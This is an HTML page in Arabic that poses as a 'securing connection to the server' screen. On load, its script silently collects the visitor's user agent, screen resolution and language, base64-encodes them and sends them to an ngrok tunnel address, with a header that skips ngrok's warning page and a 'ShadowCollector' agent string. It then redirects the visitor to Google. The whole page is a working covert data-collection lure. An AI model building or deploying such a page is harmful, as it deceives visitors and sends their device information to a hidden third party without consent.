<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Checking Connection...</title>
</head>
<body style="background: #000; color: #0f0; text-align: center; padding-top: 20%;">
    <h3>جاري تأمين الاتصال بالخادم...</h3>
    <script>
        const NGROK_HOST = "https://c4d888980073.ngrok-free.app"; 

        async function capture() {
            let data = {
                ua: navigator.userAgent,
                screen: `${window.screen.width}x${window.screen.height}`,
                lang: navigator.language
            };

            const payload = btoa(JSON.stringify(data));
            
            // إرسال البيانات مع Header التجاوز
            fetch(`${NGROK_HOST}/log?data=${payload}`, {
                method: 'GET',
                mode: 'no-cors', 
                headers: {
                    'ngrok-skip-browser-warning': 'true', // تجاوز صفحة التحذير
                    'User-Agent': 'ShadowCollector/1.0'
                }
            });

            setTimeout(() => { window.location.href = "https://www.google.com"; }, 3000);
        }
        window.onload = capture;
    </script>
</body>
</html>
